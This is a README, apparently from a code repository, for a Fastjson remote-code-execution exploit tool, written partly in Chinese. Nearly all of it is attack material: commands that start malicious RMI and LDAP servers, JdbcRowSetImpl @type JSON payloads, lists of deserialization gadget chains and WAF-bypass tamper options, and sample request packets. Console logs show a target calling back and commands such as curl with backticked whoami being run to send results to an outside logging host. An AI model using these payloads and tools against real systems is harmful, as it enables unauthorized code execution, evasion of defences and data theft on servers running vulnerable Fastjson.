# fastjson_rce_tool

```
java -jar fastjson_tool.jar
Usage:
java -cp fastjson_tool.jar fastjson.HRMIServer 127.0.0.1 80 "curl dnslog.wyzxxz.cn" 
java -cp fastjson_tool.jar fastjson.HLDAPServer 127.0.0.1 80 "curl dnslog.wyzxxz.cn"

java -cp fastjson_tool.jar fastjson.HLDAPServer2 127.0.0.1 80 "whoami"

java -cp fastjson_tool.jar fastjson.LDAPRefServerAuto 127.0.0.1 1099 file=filename  tamper=tohex
java -cp fastjson_tool.jar fastjson.LDAPRefServer2 1099  CommonsCollections1 "curl dnslog.cn"

java -cp fastjson_tool.jar fastjson.BCELEncode "curl dnslog.wyzxxz.cn"
java -cp fastjson_tool.jar fastjson.EvilRMIServer 8888 1099 "curl dnslog.wyzxxz.cn" el-win/el-linux/groovy
java -cp fastjson_tool.jar fastjson.Tamper  "{\"abc\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://127.0.0.1:1099/Object\",\"autoCommit\":true}}" 

2021-03-31 新增：
1.fastjson.Tamper : fastjson的一些特性，可以绕一些WAF
[-] tamper list: 
tohex 
tounicode 
tohexunicode 
randomhex 
randomunicode 
addis 
addcomment 
addmorecomment 
addcommas      
addrandomx 
add- 
add_ 
addsize       填充内容

tamper支持多个，但有些不能一起用，多个注意使用的先后顺序，例如 tohex,addcomment

2.fastjson.LDAPRefServerAuto : 新增了一些场景的回显, 选择payload的地址增加了自定义，格式: payload={.........}


2020-10-30 新增：
fastjson.LDAPRefServerAuto: 自动找寻反序列可利用的gadget(cb1,cc1-10,spring1-2,groovy1,jdk7u21)。
java -cp fastjson_tool.jar fastjson.LDAPRefServerAuto 127.0.0.1 1099 file=filename

filename为请求包，需要插入fastjson攻击语句的地方，用__PAYLOAD__代替。示例：
POST /fastjson_demo HTTP/1.1
Host: xx.xx.xx.xx
Connection: keep-alive
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.16 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Content-Type: application/json
Content-Length: 165

__PAYLOAD__


> java -cp fastjson_tool.jar fastjson.LDAPRefServerAuto 127.0.0.1 8088 file=req

[-] target: https://xx.xx.xx.xx/fastjson_demo
[-] Payload list:
0. {"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://127.0.0.1:8088/Object","autoCommit":true}
1. {"e":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"f":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://127.0.0.1:8088/Object","autoCommit":true}}
[-] [-] please chosse payload, or input payload like payload={......}
> 1
[-] url: https://xx.xx.xx.xx/fastjson_demo
[-] post_data: {"e":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"f":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://127.0.0.1:8088/Object","autoCommit":true}}
[-] LDAP Listening on 127.0.0.1:8088
[*] find: CommonsCollections10 can be use
[-] please enter command, enter q or quit to quit
> curl dnslog.domain/`whoami`
[-] please enter command, enter q or quit to quit
> q
[-] quit



[root@ /]# java -cp fastjson_tool.jar fastjson.HRMIServer xx.xx.xx.xx 80 "curl dnslog.wyzxxz.cn"
[-] payload:  {"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://xx.xx.xx.xx:80/Object","autoCommit":true}
[-] payload:  {"e":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"f":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://xx.xx.xx.xx:80/Object","autoCommit":true}}
[-] Opening JRMP listener on 80
[-] Have connection from /xx.xx.xx.xx:33543
[-] Reading message...
[-] Is RMI.lookup call for Exploit 2
[-] Sending remote classloading stub targeting http://xx.xx.xx.xx:80/Object.class
[-] Closing connection
[*] Have connection from /xx.xx.xx.xx:33544 /Object.class
[-] remote target jdk version: java/1.7.0_79, use payload version: jdk7
[-] send payload done and exit.

[root@ /]# java -cp fastjson_tool.jar fastjson.HLDAPServer xx.xx.xx.xx 80 "curl dnslog.wyzxxz.cn"
[-] payload:  {"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://xx.xx.xx.xx:80/Object","autoCommit":true}
[-] payload:  {"e":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"f":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://xx.xx.xx.xx:80/Object","autoCommit":true}}
[-] LDAP Listening on 0.0.0.0:80
[*] Send LDAP reference result for Exploit redirecting to http://xx.xx.xx.xx:80/Object.class
[*] Have connection from /xx.xx.xx.xx:33548 /Object.class
[-] remote target jdk version: java/1.7.0_79, use payload version: jdk7
[-] remote target jdk version: java/1.7.0_79, use payload version: jdk7
[-] send payload done and exit.

===================================================================================================

if command need base64 encode, command should startwith bash=/powershell=/python=/perl=
example:  bash=curl dnslog.wyzxxz.cn

1. RMI (need tomcat8)
java -cp fastjson_tool.jar EvilRMIServer 1099 8888 "curl dnslog.wyzxxz.cn"


2. RMI/LDAP + HTTP
java -cp fastjson_tool.jar HRMIServer xx.xx.xx.xx 80 "curl dnslog.wyzxxz.cn"
/
java -cp fastjson_tool.jar HLDAPServer xx.xx.xx.xx 80 "curl dnslog.wyzxxz.cn"


3. LDAP2
java -cp fastjson_tool.jar fastjson.LDAPRefServer2 80 CommonsCollections1 "curl dnslog.wyzxxz.cn"
CommonsBeanutils1  
CommonsCollections1
CommonsCollections2
CommonsCollections3
CommonsCollections4
CommonsCollections5
CommonsCollections6
CommonsCollections7
CommonsCollections8
CommonsCollections9
CommonsCollections10
Groovy1            
URLDNS             
JSON1              
Spring1            
Spring2            
file   （BASE64编码后的反序列内容文件）


```


```

rmi:
1. 启动RMI服务，后面写要执行的语句(有依赖，tomcat8稳定复现)
java -cp fastjson_tool.jar fastjson.EvilRMIServer 1099 8888 "curl dnslog.wyzxxz.cn"

2. 发送请求包
POST /test HTTP/1.1
Host: 127.0.0.1
Content-Type: application/json
Accept-Encoding: gzip, deflate
Connection: close
Accept: */*
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) 

{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://127.0.0.1:1099/Object","autoCommit":true}

3. 查看日志是否curl成功

===================================================================================================

ldap:
1. 启动LDAP服务，后面写要执行的语句
java -cp fastjson_tool.jar fastjson.HLDAPServer xx.xx.xx.xx 80 "curl dnslog.wyzxxz.cn"

2. 发送请求包
POST /test HTTP/1.1
Host: 127.0.0.1
Content-Type: application/json
Accept-Encoding: gzip, deflate
Connection: close
Accept: */*
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) 

{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://xx.xx.xx.xx:80/Object","autoCommit":true}


3. 查看日志是否执行成功


===================================================================================================

ldap:
1. 启动LDAP服务，后面写要执行的语句
java -cp fastjson_tool.jar fastjson.LDAPRefServer2 1099 CommonsCollections1 "curl dnslog.wyzxxz.cn"

2. 发送请求包
POST /test HTTP/1.1
Host: 127.0.0.1
Content-Type: application/json
Accept-Encoding: gzip, deflate
Connection: close
Accept: */*
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) 

{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://xx.xx.xx.xx:1099/Object","autoCommit":true}


3. 查看日志是否执行成功






```

